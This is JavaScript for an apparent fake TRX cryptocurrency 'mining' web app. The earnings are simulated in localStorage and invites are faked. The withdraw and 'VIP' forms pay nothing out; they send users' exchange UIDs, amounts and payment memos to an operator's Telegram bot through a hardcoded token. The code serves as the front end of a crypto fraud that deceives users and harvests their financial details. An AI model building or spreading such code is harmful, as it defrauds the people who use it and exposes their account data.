const BOT_TOKEN = "7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI";
const ADMIN_CHAT_ID = "7417215529";
const TRX_PRICE_USDT = 0.0006;
const REWARD_TRX = 5;
const MINING_DURATION_MS = 2 * 60 * 60 * 1000;
const NEW_ACCOUNT_TRX = 20;

function getState(k, d) {
  try { return JSON.parse(localStorage.getItem(k)) || d; } catch (e) { return d; }
}
function setState(k, v) { localStorage.setItem(k, JSON.stringify(v)); }

let state = getState('trx_app', {
  trx: NEW_ACCOUNT_TRX,
  usdt: NEW_ACCOUNT_TRX * TRX_PRICE_USDT,
  mining: false,
  end: 0,
  team: 0,
  vip: false
});

const pages = {
  mine: document.getElementById('page-mine'),
  team: document.getElementById('page-team'),
  me: document.getElementById('page-me'),
  vip: document.getElementById('page-vip')
};

document.querySelectorAll('.nav-btn').forEach(b => {
  b.onclick = () => {
    document.querySelectorAll('.nav-btn').forEach(x => x.classList.remove('active'));
    b.classList.add('active');
    Object.values(pages).forEach(p => p.classList.remove('active'));
    document.getElementById(b.dataset.target).classList.add('active');
  };
});

const mineBtn = document.getElementById('mineActionBtn');
const prog = document.getElementById('progressInner');
const timer = document.getElementById('progressTimer');
const status = document.getElementById('mineStatus');
const msg = document.getElementById('mineMessage');
let interval = null;

const animationEl = document.createElement('div');
animationEl.className = 'mining-animation hidden';
animationEl.innerHTML = `<div class="spin"></div><div class="glow"></div>`;
document.querySelector('.mine-card').appendChild(animationEl);

function render() {
  document.getElementById('meTRX').innerText = state.trx.toFixed(4);
  document.getElementById('meUSDT').innerText = state.usdt.toFixed(6);
  document.getElementById('teamCount').innerText = state.team;
  updateMine();
  setState('trx_app', state);
}

function updateMine() {
  if (state.mining && state.end > Date.now()) {
    const r = state.end - Date.now();
    const pct = Math.min(100, (1 - (r / MINING_DURATION_MS)) * 100);
    prog.style.width = pct + '%';
    const h = Math.floor(r / 3600000),
      m = Math.floor((r % 3600000) / 60000),
      s = Math.floor((r % 60000) / 1000);
    timer.innerText = `Time: ${h}h ${m}m ${s}s`;
    status.innerText = 'Mining...';
    mineBtn.innerText = 'Mining...';
    mineBtn.disabled = true;
    animationEl.classList.remove('hidden');
    if (!interval) interval = setInterval(updateMine, 1000);
  } else if (state.mining && state.end <= Date.now()) {
    clearInterval(interval);
    interval = null;
    prog.style.width = '100%';
    timer.innerText = 'Ready to claim';
    status.innerText = 'Completed';
    mineBtn.disabled = false;
    mineBtn.innerText = `Collect Reward (${REWARD_TRX} TRX)`;
    animationEl.classList.add('hidden');
    mineBtn.onclick = collect;
  } else {
    prog.style.width = '0%';
    timer.innerText = 'Not started';
    status.innerText = 'Idle';
    mineBtn.disabled = false;
    mineBtn.innerText = 'Start Mining';
    animationEl.classList.add('hidden');
    mineBtn.onclick = start;
  }
}

function start() {
  state.mining = true;
  state.end = Date.now() + MINING_DURATION_MS;
  msg.innerText = '⛏️ Mining started!';
  render();
}

function collect() {
  state.trx += REWARD_TRX;
  state.usdt = state.trx * TRX_PRICE_USDT;
  state.mining = false;
  state.end = 0;
  msg.innerText = `✅ Collected ${REWARD_TRX} TRX`;
  sendTG(`⛏️ Reward collected: ${REWARD_TRX} TRX`);
  render();
}

document.getElementById('convertDo').onclick = () => {
  const v = parseFloat(document.getElementById('convertInput').value || 0);
  if (v <= 0 || v > state.trx) return alert('Invalid amount');
  const u = v * TRX_PRICE_USDT;
  state.trx -= v;
  state.usdt += u;
  document.getElementById('convertResult').innerText = `Converted ${v} TRX → ${u.toFixed(6)} USDT`;
  sendTG(`🔁 Convert: ${v} TRX → ${u.toFixed(6)} USDT`);
  render();
};

document.getElementById('submitWithdraw').onclick = () => {
  const uid = document.getElementById('withdrawUID').value.trim(),
    amt = parseFloat(document.getElementById('withdrawAmount').value || 0),
    method = document.getElementById('withdrawMethod').value;
  if (!uid || amt <= 0 || amt > state.usdt) return alert('Invalid');
  state.usdt -= amt;
  document.getElementById('withdrawMsg').innerText = `Withdraw ${amt} USDT to ${method} (${uid})`;
  sendTG(`💸 Withdraw: ${amt} USDT → ${method} UID ${uid}`);
  render();
};

document.getElementById('fakeInviteBtn').onclick = () => { state.team++; render(); };
document.getElementById('copyRefBtn').onclick = () => {
  navigator.clipboard.writeText(location.href + '?ref=' + state.team);
  alert('Copied!');
};

document.getElementById('vipSubmit').onclick = () => {
  const type = document.getElementById('vipType').value,
    ex = document.getElementById('vipExchange').value,
    uid = document.getElementById('vipSenderUID').value.trim(),
    memo = document.getElementById('vipMemo').value.trim();
  if (!uid || !memo) return alert('Fill all');
  document.getElementById('vipMsg').innerText = 'VIP request sent.';
  sendTG(`🌟 VIP Request\nType:${type}\nExchange:${ex}\nUID:${uid}\nMemo:${memo}`);
};

function sendTG(t) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: t })
  });
}

render();
